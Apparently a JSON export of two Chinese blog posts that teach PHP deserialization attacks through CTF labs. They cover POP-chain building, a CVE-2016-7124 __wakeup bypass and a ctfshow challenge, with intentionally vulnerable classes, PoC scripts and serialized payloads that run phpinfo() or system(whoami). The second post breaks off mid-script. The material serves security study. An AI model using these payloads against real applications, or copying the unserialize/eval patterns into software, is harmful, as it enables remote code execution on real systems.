[{"content":"pop链 pop链，通过反序列化控制class属性，来构造一条完整的利用链。\neasy \u0026lt;?php //error_reporting(0); highlight_file(__FILE__); class errorr0{ protected $var; function __construct() { $this-\u0026gt;var = new errorr1(); } function __destruct() { $this-\u0026gt;var-\u0026gt;func(); } } class errorr1 { public $var; function func() { echo $this-\u0026gt;var; } } class errorr2 { private $data; public function func() { eval($this-\u0026gt;data); } } unserialize($_GET[\u0026#39;err\u0026#39;]); ?\u0026gt; 反向构造pop链，errorr2::func()-\u0026gt;errorr0::__destruct()-\u0026gt;errorr0::__construct\npoc \u0026lt;?php //error_reporting(0); highlight_file(__FILE__); class errorr0{ protected $var; function __construct() { $this-\u0026gt;var = new errorr1(); } function __destruct() { $this-\u0026gt;var-\u0026gt;func(); } } class errorr1 { public $var; function func() { echo $this-\u0026gt;var; } } class errorr2 { private $data; public function func() { eval($this-\u0026gt;data); } } $a = new errorr0; $a-\u0026gt;var=new errorr2; $a-\u0026gt;var-\u0026gt;data=\u0026#39;phpinfo();\u0026#39;; echo serialize($a);\t//O:7:\u0026#34;errorr0\u0026#34;:1:{s:3:\u0026#34;var\u0026#34;;O:7:\u0026#34;errorr2\u0026#34;:1:{s:4:\u0026#34;data\u0026#34;;s:10:\u0026#34;phpinfo();\u0026#34;;}} //`errorr2::func()`-\u0026gt;`errorr0::__destruct()`-\u0026gt;`errorr0::__construct` ?\u0026gt; 但是这样会报错。\n因为class里面的属性不是public。我们更改一下class的属性\n成功rce。但是我们如何在不修改class的属性下进行更改呢？这个时候就需要利用构造函数以及在内部修改。\n\u0026lt;?php //error_reporting(0); highlight_file(__FILE__); class errorr0{ protected $var; function __construct() { $this-\u0026gt;var = new errorr2();\t//errorr1-\u0026gt;errorr2 } function __destruct() { $this-\u0026gt;var-\u0026gt;func(); } } class errorr1 { public $var; function func() { echo $this-\u0026gt;var; } } class errorr2 { private $data = \u0026#39;phpinfo();\u0026#39;;\t//$data-\u0026gt;\u0026#39;phpinfo();\u0026#39; public function func() { eval($this-\u0026gt;data); } } $a = new errorr0; // $a-\u0026gt;var=new errorr2; // $a-\u0026gt;var-\u0026gt;data=\u0026#39;phpinfo();\u0026#39;; echo serialize($a);\t//O:7:\u0026#34;errorr0\u0026#34;:1:{s:6:\u0026#34;*var\u0026#34;;O:7:\u0026#34;errorr2\u0026#34;:1:{s:13:\u0026#34;errorr2data\u0026#34;;s:10:\u0026#34;phpinfo();\u0026#34;;}} echo \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; print_r($a);\t//errorr0 Object ( [var:protected] =\u0026gt; errorr2 Object ( [data:errorr2:private] =\u0026gt; phpinfo(); ) ) echo \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;;\t//可以看见$a class的属性也打印出来了 echo urlencode(serialize($a));\t//由于有private和protected属性，所以存在不可见字符（%00）需要url编码。 //`errorr2::func()`-\u0026gt;`errorr0::__destruct()`-\u0026gt;`errorr0::__construct` ?\u0026gt; 对比一下poc的差异\nprint_r 1.\terrorr0 Object ( [var] =\u0026gt; errorr2 Object ( [data] =\u0026gt; phpinfo(); ) ) 2.\terrorr0 Object ( [var:protected] =\u0026gt; errorr2 Object ( [data:errorr2:private] =\u0026gt; phpinfo(); ) ) 反序列化 1.\tO:7:\u0026#34;errorr0\u0026#34;:1:{s:3:\u0026#34;var\u0026#34;;O:7:\u0026#34;errorr2\u0026#34;:1:{s:4:\u0026#34;data\u0026#34;;s:10:\u0026#34;phpinfo();\u0026#34;;}} 2.\tO:7:\u0026#34;errorr0\u0026#34;:1:{s:6:\u0026#34;*var\u0026#34;;O:7:\u0026#34;errorr2\u0026#34;:1:{s:13:\u0026#34;errorr2data\u0026#34;;s:10:\u0026#34;phpinfo();\u0026#34;;}} test \u0026lt;?php //error_reporting(0); highlight_file(__FILE__); class w44m{ private $admin = \u0026#39;aaa\u0026#39;; protected $passwd = \u0026#39;123456\u0026#39;; public function Getflag(){ if($this-\u0026gt;admin === \u0026#39;w44m\u0026#39; \u0026amp;\u0026amp; $this-\u0026gt;passwd ===\u0026#39;08067\u0026#39;){ include(\u0026#39;flag.php\u0026#39;); echo $flag; }else{ echo $this-\u0026gt;admin; echo $this-\u0026gt;passwd; echo \u0026#39;nono\u0026#39;; } } } class w22m{ public $w00m; public function __destruct(){ echo $this-\u0026gt;w00m; } } class w33m{ public $w00m; public $w22m; public function __toString(){ $this-\u0026gt;w00m-\u0026gt;{$this-\u0026gt;w22m}(); return 0; } } $w00m = $_GET[\u0026#39;w00m\u0026#39;]; unserialize($w00m); ?\u0026gt; 反向构造pop链，w44m::Getflag()-\u0026gt;w33m::__toString()-\u0026gt;w22m::__destruct()\npoc \u0026lt;?php //error_reporting(0); highlight_file(__FILE__); class w44m{ private $admin = \u0026#39;w44m\u0026#39;;\t//手动改一下 protected $passwd = \u0026#39;08067\u0026#39;;\t//手动改一下 public function Getflag(){ if($this-\u0026gt;admin === \u0026#39;w44m\u0026#39; \u0026amp;\u0026amp; $this-\u0026gt;passwd ===\u0026#39;08067\u0026#39;){ include(\u0026#39;flag.php\u0026#39;); echo $flag; }else{ echo $this-\u0026gt;admin; echo $this-\u0026gt;passwd; echo \u0026#39;nono\u0026#39;; } } } class w22m{ public $w00m; public function __destruct(){ echo $this-\u0026gt;w00m; } } class w33m{ public $w00m; public $w22m; public function __toString(){ echo \u0026#34;w33m __toString\u0026#34;. \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; $this-\u0026gt;w00m-\u0026gt;{$this-\u0026gt;w22m}(); return 0; } } $a = new w22m; $a-\u0026gt;w00m=new w33m; $a-\u0026gt;w00m-\u0026gt;w00m=new w44m; $a-\u0026gt;w00m-\u0026gt;w22m=\u0026#39;Getflag\u0026#39;; echo \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; print_r($a);\t//w22m Object ( [w00m] =\u0026gt; w33m Object ( [w00m] =\u0026gt; w44m Object ( [admin:w44m:private] =\u0026gt; w44m [passwd:protected] =\u0026gt; 08067 ) [w22m] =\u0026gt; Getflag ) ) echo \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; echo serialize($a); echo \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; echo urlencode(serialize($a)); //`w44m::Getflag()`-\u0026gt;`w33m::__toString()`-\u0026gt;`w22m::__destruct()` ?\u0026gt; ctf 先学习一些tips。\ntips __get() \u0026lt;?php highlight_file(__FILE__); class A { private $test; function __get($a){ echo $a;\t//test2 } } $a = new A; $a-\u0026gt;test2; ?\u0026gt; 当访问一个不存在的变量时，变量名会传递给__get()。\n__call() \u0026lt;?php highlight_file(__FILE__); class A { private $test; function __get($a){ echo $a; } function __call($b,$c){ echo $b;\t//test3 print_r($c);\t//Array ( [0] =\u0026gt; test4 ) } } $a = new A; $a-\u0026gt;test2; $a-\u0026gt;test3(test4); ?\u0026gt; 当访问一个不存在的函数时，函数名和实参会被传递给__call()\ncall_user_func() \u0026lt;?php highlight_file(__FILE__); function hello($a) { echo \u0026#34;hello \u0026#34;. $a; } call_user_func(hello,dayu); class A { function hello1($a) { echo \u0026#34;hello \u0026#34;. $a; } } call_user_func([A, hello1], dayu1) ?\u0026gt; call_user_func(函数, 参数)\ncall_user_func([类, 方法], 参数)\narray_walk() \u0026lt;?php highlight_file(__FILE__); echo \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; function myfunction($value,$key,$p) { echo \u0026#34;$key $p $value\u0026lt;br\u0026gt;\u0026#34;; } $a=array(\u0026#34;a\u0026#34;=\u0026gt;\u0026#34;red\u0026#34;,\u0026#34;b\u0026#34;=\u0026gt;\u0026#34;green\u0026#34;,\u0026#34;c\u0026#34;=\u0026gt;\u0026#34;blue\u0026#34;); array_walk($a,\u0026#34;myfunction\u0026#34;,\u0026#34;has the value\u0026#34;);\t//array_walk(array,myfunction,parameter...) ?\u0026gt; array_walk(数组, 函数, 另外一个参数)\ngc tmp\ncode \u0026lt;?php /** * @Author: F10wers_13eiCheng * @Date: 2022-02-01 11:25:02 * @Last Modified by: F10wers_13eiCheng * @Last Modified time: 2022-02-07 15:08:18 */ highlight_file(__FILE__); include(\u0026#34;./HappyYear.php\u0026#34;); class one { public $object; public function MeMeMe() { echo \u0026#34;\u0026lt;p\u0026gt;one::MeMeMe()\u0026lt;p\u0026gt;\u0026#34;; array_walk($this, function($fn, $prev){ echo \u0026#34;\u0026lt;p\u0026gt;one::MeMeMe()::array_walk()\u0026lt;p\u0026gt;\u0026#34;; if ($fn[0] === \u0026#34;Happy_func\u0026#34; \u0026amp;\u0026amp; $prev === \u0026#34;year_parm\u0026#34;) { global $talk; echo \u0026#34;$talk\u0026#34;.\u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; global $flag; echo $flag; } }); } public function __destruct() { echo \u0026#34;\u0026lt;p\u0026gt;one::__destruct()\u0026lt;p\u0026gt;\u0026#34;; @$this-\u0026gt;object-\u0026gt;add(); } public function __toString() { echo \u0026#34;\u0026lt;p\u0026gt;one::__toString()\u0026lt;p\u0026gt;\u0026#34;; return $this-\u0026gt;object-\u0026gt;string; } } class second { protected $filename; protected function addMe() { echo \u0026#34;\u0026lt;p\u0026gt;second::addMe()\u0026lt;p\u0026gt;\u0026#34;; return \u0026#34;Wow you have sovled\u0026#34;.$this-\u0026gt;filename; } public function __call($func, $args) { echo \u0026#34;\u0026lt;p\u0026gt;second::__call()\u0026lt;p\u0026gt;\u0026#34;; call_user_func([$this, $func.\u0026#34;Me\u0026#34;], $args); } } class third { private $string; public function __construct($string) { echo \u0026#34;\u0026lt;p\u0026gt;third::__construct()\u0026lt;p\u0026gt;\u0026#34;; $this-\u0026gt;string = $string; } public function __get($name) { echo \u0026#34;\u0026lt;p\u0026gt;third::__get()\u0026lt;p\u0026gt;\u0026#34;; $var = $this-\u0026gt;$name; $var[$name](); } } if (isset($_GET[\u0026#34;ctfshow\u0026#34;])) { $a=unserialize($_GET[\u0026#39;ctfshow\u0026#39;]); //throw new Exception(\u0026#34;高一新生报道\u0026#34;);\t先注释掉，方便调试。 } else { echo \u0026#34;\u0026lt;p\u0026gt;please get ctfshow\u0026lt;p\u0026gt;\u0026#34;; } pop链 现在来反向构造pop利用链，one::MeMeMe()-\u0026gt;third::__get()-\u0026gt;\u0026hellip;\n正向构造一下试试，one::__destruct()-\u0026gt;second::__call()-\u0026gt;second::addMe()-\u0026gt;one::__toString()-\u0026gt;\u0026hellip;\n结合一下，整个正向pop链为：one::__destruct()-\u0026gt;second::__call()-\u0026gt;second::addMe()-\u0026gt;one::__toString()-\u0026gt;third::__get()-\u0026gt;one::MeMeMe()\n首先通过one::__destruct()调用一个不存在的add()去触发second::__call()然后通过call_user_func()回调自身的second::addMe()这里return了一个String类型，所以可以去触发one::__toString()然后返回了一个不存在的string变量去触发third::__get()，最后在调用one::MeMeMe()拿到flag。\n擦，昨天弄2小时，今天弄了快3小时，现在闭着眼都能写出来了。\n\u0026lt;?php /** * @Author: F10wers_13eiCheng * @Date: 2022-02-01 11:25:02 * @Last Modified by: F10wers_13eiCheng * @Last Modified time: 2022-02-07 15:08:18 */ highlight_file(__FILE__); include(\u0026#34;./HappyYear.php\u0026#34;); class one { public $object; public $year_parm = array(\u0026#34;Happy_func\u0026#34;);\t//构造一个数组 public function MeMeMe() { echo \u0026#34;\u0026lt;p\u0026gt;one::MeMeMe()\u0026lt;p\u0026gt;\u0026#34;; array_walk($this, function($fn, $prev){\t//当array_walk传入类的时候会将类里面的变量名和变量名当成数组。 echo \u0026#34;\u0026lt;p\u0026gt;one::MeMeMe()::array_walk()\u0026lt;p\u0026gt;\u0026#34;; if ($fn[0] === \u0026#34;Happy_func\u0026#34; \u0026amp;\u0026amp; $prev === \u0026#34;year_parm\u0026#34;) {\t//$year_parm = array(\u0026#34;Happy_func\u0026#34;) global $talk; echo \u0026#34;$talk\u0026#34;.\u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; global $flag; echo $flag; } }); } public function __destruct() { echo \u0026#34;\u0026lt;p\u0026gt;one::__destruct()\u0026lt;p\u0026gt;\u0026#34;; @$this-\u0026gt;object-\u0026gt;add(); } public function __toString() { echo \u0026#34;\u0026lt;p\u0026gt;one::__toString()\u0026lt;p\u0026gt;\u0026#34;; return $this-\u0026gt;object-\u0026gt;string; } } class second { protected $filename; public function __construct() { $this-\u0026gt;filename = new one; $this-\u0026gt;filename-\u0026gt;object = new third([\u0026#34;string\u0026#34;=\u0026gt;[new one(),\u0026#34;MeMeMe\u0026#34;]]); }\t//手动构造`__construct`用来触发下面的`second::addMe()`-\u0026gt;`one::__toString()`，同时给`third::__construct`传入实参。 protected function addMe() { echo \u0026#34;\u0026lt;p\u0026gt;second::addMe()\u0026lt;p\u0026gt;\u0026#34;; return \u0026#34;Wow you have sovled\u0026#34;.$this-\u0026gt;filename; } public function __call($func, $args) { echo \u0026#34;\u0026lt;p\u0026gt;second::__call()\u0026lt;p\u0026gt;\u0026#34;; call_user_func([$this, $func.\u0026#34;Me\u0026#34;], $args); } } class third { private $string; public function __construct($string) { echo \u0026#34;\u0026lt;p\u0026gt;third::__construct()\u0026lt;p\u0026gt;\u0026#34;; $this-\u0026gt;string = $string;\t//string = [\u0026#34;string\u0026#34;=\u0026gt;[new one(),\u0026#34;MeMeMe\u0026#34;]] } public function __get($name) { echo \u0026#34;\u0026lt;p\u0026gt;third::__get()\u0026lt;p\u0026gt;\u0026#34;; $var = $this-\u0026gt;$name; $var[$name]();\t//[\u0026#34;string\u0026#34;=\u0026gt;[new one(),\u0026#34;MeMeMe\u0026#34;]][string]()这里会触发`third::__get()`-\u0026gt;`one::MeMeMe()` } } $a = new one; $b = new second; $a-\u0026gt;object = $b; //`one::__destruct()`-\u0026gt;`second::__call()`-\u0026gt;`second::addMe()` //`one::__destruct()`-\u0026gt;`second::__call()`-\u0026gt;`second::addMe()`-\u0026gt;`one::__toString()`-\u0026gt;`third::__get()`-\u0026gt;`one::MeMeMe()` echo \u0026#34;\u0026lt;p\u0026gt;\u0026#34;. serialize($a). \u0026#34;\u0026lt;p\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;p\u0026gt;\u0026#34;. urlencode(serialize($a)). \u0026#34;\u0026lt;p\u0026gt;\u0026#34;; O:3:\u0026#34;one\u0026#34;:2:{s:6:\u0026#34;object\u0026#34;;O:6:\u0026#34;second\u0026#34;:1:{s:11:\u0026#34;*filename\u0026#34;;O:3:\u0026#34;one\u0026#34;:2:{s:6:\u0026#34;object\u0026#34;;O:5:\u0026#34;third\u0026#34;:1:{s:13:\u0026#34;thirdstring\u0026#34;;a:1:{s:6:\u0026#34;string\u0026#34;;a:2:{i:0;O:3:\u0026#34;one\u0026#34;:2:{s:6:\u0026#34;object\u0026#34;;N;s:9:\u0026#34;year_parm\u0026#34;;a:1:{i:0;s:10:\u0026#34;Happy_func\u0026#34;;}}i:1;s:6:\u0026#34;MeMeMe\u0026#34;;}}}s:9:\u0026#34;year_parm\u0026#34;;a:1:{i:0;s:10:\u0026#34;Happy_func\u0026#34;;}}}s:9:\u0026#34;year_parm\u0026#34;;a:1:{i:0;s:10:\u0026#34;Happy_func\u0026#34;;}} O%3A3%3A%22one%22%3A2%3A%7Bs%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22%00third%00string%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A6%3A%22object%22%3BN%3Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7D%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7Ds%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7D%7D%7Ds%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7D%7D demo \u0026lt;?php highlight_file(__FILE__); class one { public $key = \u0026#39;value\u0026#39;; public $year_parm = array(0=\u0026gt;\u0026#34;Happy_func\u0026#34;); function MeMeMe(){ echo \u0026#34;yes\u0026lt;p\u0026gt;\u0026#34;; } function test(){ echo \u0026#34;one::test\u0026lt;p\u0026gt;\u0026#34;; array_walk($this, function($fn, $prev){ echo \u0026#34;one::test::array_walk\u0026lt;p\u0026gt;\u0026#34;; print_r($fn); echo \u0026#34;\u0026lt;p\u0026gt;\u0026#34;; print_r($prev); echo \u0026#34;\u0026lt;p\u0026gt;\u0026#34;; }); } } [\u0026#34;string\u0026#34;=\u0026gt;[new one(),\u0026#34;MeMeMe\u0026#34;]][string](); $a = new one(); $a-\u0026gt;test(); 还有个垃圾回收GC机制来绕过异常处理的，明天来写吧，今天累了。\n","permalink":"https://killdayu.com/posts/php_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96_2/","summary":"pop链 pop链，通过反序列化控制class属性，来构造一条完整的利用链。\neasy \u0026lt;?php //error_reporting(0); highlight_file(__FILE__); class errorr0{ protected $var; function __construct() { $this-\u0026gt;var = new errorr1(); } function __destruct() { $this-\u0026gt;var-\u0026gt;func(); } } class errorr1 { public $var; function func() { echo $this-\u0026gt;var; } } class errorr2 { private $data; public function func() { eval($this-\u0026gt;data); } } unserialize($_GET[\u0026#39;err\u0026#39;]); ?\u0026gt; 反向构造pop链，errorr2::func()-\u0026gt;errorr0::__destruct()-\u0026gt;errorr0::__construct\npoc \u0026lt;?php //error_reporting(0); highlight_file(__FILE__); class errorr0{ protected $var; function __construct() { $this-\u0026gt;var = new errorr1(); } function __destruct() { $this-\u0026gt;var-\u0026gt;func(); } } class errorr1 { public $var; function func() { echo $this-\u0026gt;var; } } class errorr2 { private $data; public function func() { eval($this-\u0026gt;data); } } $a = new errorr0; $a-\u0026gt;var=new errorr2; $a-\u0026gt;var-\u0026gt;data=\u0026#39;phpinfo();\u0026#39;; echo serialize($a);\t//O:7:\u0026#34;errorr0\u0026#34;:1:{s:3:\u0026#34;var\u0026#34;;O:7:\u0026#34;errorr2\u0026#34;:1:{s:4:\u0026#34;data\u0026#34;;s:10:\u0026#34;phpinfo();\u0026#34;;}} //`errorr2::func()`-\u0026gt;`errorr0::__destruct()`-\u0026gt;`errorr0::__construct` ?","title":"php_反序列化_2"},{"content":"简介 不会php。\nhttps://www.php.net/manual/zh/language.oop5.serialization.php\n\u0026lt;?php class A { public $one = 1; public $two = \u0026#39;2\u0026#39;; public function show_one() { echo $this-\u0026gt;one; } } $a = new A; $s = serialize($a); echo $s;\tO:1:\u0026#34;A\u0026#34;:2:{s:3:\u0026#34;one\u0026#34;;i:1;s:3:\u0026#34;two\u0026#34;;s:1:\u0026#34;2\u0026#34;;} ?\u0026gt; https://www.toolnb.com/tools/phpserialize.html\n序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。\nO:1:\u0026#34;A\u0026#34;:2:{s:3:\u0026#34;one\u0026#34;;i:1;s:3:\u0026#34;two\u0026#34;;s:1:\u0026#34;2\u0026#34;;} object(__PHP_Incomplete_Class)#5 (3) { [\u0026#34;__PHP_Incomplete_Class_Name\u0026#34;]=\u0026gt; string(1) \u0026#34;A\u0026#34; [\u0026#34;one\u0026#34;]=\u0026gt; int(1) [\u0026#34;two\u0026#34;]=\u0026gt; string(1) \u0026#34;2\u0026#34; } 序列化就是将对象转换成字符串来存储，反序列化就是将字符串还原为对象。\nphp通过serialize()和unserialize()来进行序列化操作。\n其中有几个魔术方法需要关注一下。\nhttps://www.php.net/manual/zh/language.oop5.magic.php\n魔术方法是一种特殊的方法，当对对象执行某些操作时会覆盖 PHP 的默认操作。\n__construct() //当一个对象创建时被调用 __destruct() //当一个对象销毁时被调用 __toString() //当一个对象被当作一个字符串使用 __sleep() //在对象被序列化之前运行 __wakeup() //在对象被反序列化之后被调用 简单的序列化 [NPUCTF2020]ReadlezPHP\n\u0026lt;?php #error_reporting(0); highlight_file(__FILE__); echo \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; class HelloPhp { public $a; public $b; public function __construct(){ $this-\u0026gt;a = \u0026#34;Y-m-d h:i:s\u0026#34;; $this-\u0026gt;b = \u0026#34;date\u0026#34;; echo \u0026#39;__construct $this-\u0026gt;a: \u0026#39;. $this-\u0026gt;a. \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; echo \u0026#39;__construct $this-\u0026gt;b: \u0026#39;. $this-\u0026gt;b. \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; } public function __destruct(){ $a = $this-\u0026gt;a; $b = $this-\u0026gt;b; echo \u0026#39;__destruct $this-\u0026gt;a: \u0026#39;. $this-\u0026gt;a. \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; echo \u0026#39;__destruct $this-\u0026gt;b: \u0026#39;. $this-\u0026gt;b. \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; echo \u0026#39;$b($a): \u0026#39;. $b($a). \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; } } $c = new HelloPhp; @$ppp = unserialize($_GET[\u0026#34;data\u0026#34;]); 可以看见HelloPhp类在创建时会给$a，$b赋值，然后在销毁的时候调用$b($a)，这里就导致了rce，如果我们控制了$a，$b就能构造类似于system(whoami)的语句来rce，\n\u0026lt;?php #error_reporting(0); highlight_file(__FILE__); class HelloPhp { public $a = \u0026#39;whoami\u0026#39;; public $b = \u0026#39;system\u0026#39;; } $c = new HelloPhp; echo serialize($c);\t//O:8:\u0026#34;HelloPhp\u0026#34;:2:{s:1:\u0026#34;a\u0026#34;;s:6:\u0026#34;whoami\u0026#34;;s:1:\u0026#34;b\u0026#34;;s:6:\u0026#34;system\u0026#34;;} __construct $this-\u0026gt;a: Y-m-d h:i:s __construct $this-\u0026gt;b: date __destruct $this-\u0026gt;a: whoami __destruct $this-\u0026gt;b: system kill\\dayu $b($a): kill\\dayu __destruct $this-\u0026gt;a: Y-m-d h:i:s __destruct $this-\u0026gt;b: date $b($a): 2022-07-20 03:05:15 可以看见反序列化传入的值在执行__destruct()覆盖了__construct()中的值。\n__wakeup()绕过 \u0026lt;?php highlight_file(__FILE__); class score{ public $name; public $score; public $grade; function __wakeup() { $this-\u0026gt;name=\u0026#39;Bob\u0026#39;; } function __destruct() { echo $this-\u0026gt;name; } } unserialize($_GET[\u0026#39;s\u0026#39;]); ?\u0026gt; 由于__wakeup()是在反序列化之后才被调用的，所以反序列化无法覆盖__wakeup()对$this-\u0026gt;name的赋值，__destruct就会一直输出Bob。这里我们如果需要绕过__wakeup()，需要使用CVE-2016-7124来跳过__wakeup()的调用。\n序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行\n\u0026lt;?php highlight_file(__FILE__); class score{ public $name = \u0026#39;dayu\u0026#39;; public $score = \u0026#39;1\u0026#39;; public $grade = \u0026#39;1\u0026#39;; function __wakeup() { $this-\u0026gt;name=\u0026#39;Bob\u0026#39;; } function __destruct() { echo $this-\u0026gt;name; } } $a = new score; echo serialize($a);\t//O:5:\u0026#34;score\u0026#34;:3:{s:4:\u0026#34;name\u0026#34;;s:4:\u0026#34;dayu\u0026#34;;s:5:\u0026#34;score\u0026#34;;s:1:\u0026#34;1\u0026#34;;s:5:\u0026#34;grade\u0026#34;;s:1:\u0026#34;1\u0026#34;;} ?\u0026gt; 但是这样是无效的\n因为__wakeup()对$this-\u0026gt;name的赋值覆盖了反序列化的值，然后我们使用CVE-2016-7124，让序列化字符串中表示对象属性个数的值大于真实的属性个数。\nO:5:\u0026#34;score\u0026#34;:3:{s:4:\u0026#34;name\u0026#34;;s:4:\u0026#34;dayu\u0026#34;;s:5:\u0026#34;score\u0026#34;;s:1:\u0026#34;1\u0026#34;;s:5:\u0026#34;grade\u0026#34;;s:1:\u0026#34;1\u0026#34;;} O:5:\u0026#34;score\u0026#34;:4:{s:4:\u0026#34;name\u0026#34;;s:4:\u0026#34;dayu\u0026#34;;s:5:\u0026#34;score\u0026#34;;s:1:\u0026#34;1\u0026#34;;s:5:\u0026#34;grade\u0026#34;;s:1:\u0026#34;1\u0026#34;;} 成功绕过\n这里需要注意一下php的版本\nPHP before 5.6.25 and 7.x before 7.0.10\n同名函数利用 \u0026lt;?php highlight_file(__FILE__); class A { var $target; function __construct(){ $this-\u0026gt;target=new B; } function __destruct(){ $this-\u0026gt;target-\u0026gt;action(); } } class B { function action(){ echo \u0026#34;action B\u0026#34;; } } class C { var $test; function action(){ echo \u0026#34;action C\u0026#34;; eval($this-\u0026gt;test); } } unserialize($_GET[\u0026#39;test\u0026#39;]); 这里class A的target 实例化了class B然后执行了class B的action函数，同时class C也有个同名函数action。\n我认为php反序列化的关键在于观察可以控制的变量。\n这里我们可以通过控制target来实例化class C，然后执行action函数从而rce。\n\u0026lt;?php highlight_file(__FILE__); class A { var $target; function __construct(){ $this-\u0026gt;target=new B; } function __destruct(){ $this-\u0026gt;target-\u0026gt;action(); } } class B { function action(){ echo \u0026#34;action B\u0026#34;; } } class C { var $test; function action(){ echo \u0026#34;action C\u0026#34;; eval($this-\u0026gt;test); } } $a = new A; $a-\u0026gt;target=new C; $a-\u0026gt;target-\u0026gt;test=\u0026#39;system(whoami);\u0026#39;; echo serialize($a);\t//O:1:\u0026#34;A\u0026#34;:1:{s:6:\u0026#34;target\u0026#34;;O:1:\u0026#34;C\u0026#34;:1:{s:4:\u0026#34;test\u0026#34;;s:15:\u0026#34;system(whoami);\u0026#34;;}} 成功的让class A的target实例化了class C，然后控制class C的test，rce。\nctf \u0026lt;?php error_reporting(0); highlight_file(__FILE__); function info($address) { echo \u0026#34;\\nyour address is $address\\n\u0026#34;. \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; } class Team { function __destruct() { $this-\u0026gt;sayhello(); } function sayhello() { foreach ($this-\u0026gt;players as $player) { echo \u0026#34;hello \u0026#34;. $player. \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; } } } class Person { var $name; var $do; function __wakeup() { echo \u0026#34;Person __wakeup\u0026#34;; $this-\u0026gt;do = \u0026#34;info\u0026#34;; } function __tostring() { echo \u0026#34;__tostring\u0026#34;; $this-\u0026gt;do = $_POST[\u0026#39;func\u0026#39;]; $this-\u0026gt;info =$_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;]; echo \u0026#34;do:\u0026#34;. $this-\u0026gt;do. \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; echo \u0026#34;info:\u0026#34;. $this-\u0026gt;info. \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; return $this-\u0026gt;name; } function __destruct() { echo $this-\u0026gt;do; ($this-\u0026gt;do)($this-\u0026gt;info); } } unserialize ($_GET[\u0026#39;content\u0026#39;]); ?\u0026gt; 观察流程，发现能控制的变量有：\nclass Team($players)\nclass Person($name，$do，$_POST['func'];，$_SERVER['HTTP_X_FORWARDED_FOR'];)\n首先发现能rce的点在class Person的__destruct函数里面的($this-\u0026gt;do)($this-\u0026gt;info);，这里我们需要控制$do和$info，$_POST['func'];和$_SERVER['HTTP_X_FORWARDED_FOR'];都是我们可控的，但是他们在__tostring()函数里面，只有class Person被当成字符串的时候才能被执行。然后看见class Team中的sayhello函数有一个echo \u0026quot;hello \u0026quot;. $player. \u0026quot;\u0026lt;/p\u0026gt;\u0026quot;;语句，这里将$player的值赋值为class Person的实例即可执行，$player又由foreach ($this-\u0026gt;players as $player) 得到，然后我们可以控制$players来给$player赋值。\n即：class Team($players)-\u0026gt;class Team($player)-\u0026gt;class Person(__tostring())-\u0026gt;class Person(__tostring($_POST['func']))-\u0026gt;class Person(__tostring($_SERVER['HTTP_X_FORWARDED_FOR']))-\u0026gt;class Person(__destruct(($this-\u0026gt;do)($this-\u0026gt;info)))-\u0026gt;rce\n\u0026lt;?php error_reporting(0); highlight_file(__FILE__); echo \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; function info($address) { echo \u0026#34;\\nyour address is $address\\n\u0026#34;. \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; } class Team { function __destruct() { $this-\u0026gt;sayhello(); } function sayhello() { foreach ($this-\u0026gt;players as $player) { echo \u0026#34;hello \u0026#34;. $player. \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; } } } class Person { var $name; var $do; function __wakeup() { echo \u0026#34;Person __wakeup\u0026#34;; $this-\u0026gt;do = \u0026#34;info\u0026#34;; } function __tostring() { echo \u0026#34;__tostring\u0026#34;. \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; $this-\u0026gt;do = $_POST[\u0026#39;func\u0026#39;]; $this-\u0026gt;info =$_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;]; echo \u0026#34;do:\u0026#34;. $this-\u0026gt;do. \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; echo \u0026#34;info:\u0026#34;. $this-\u0026gt;info. \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; echo \u0026#34;name:\u0026#34;. $this-\u0026gt;name. \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; return $this-\u0026gt;name; } function __destruct() { echo $this-\u0026gt;do; ($this-\u0026gt;do)($this-\u0026gt;info); } } //开始构造利用链 $a = new Team; $a-\u0026gt;players[]=new Person;\t//控制了players，间接让player = new Person，从而执行了class Person(__tostring())。tips：使用数组 echo 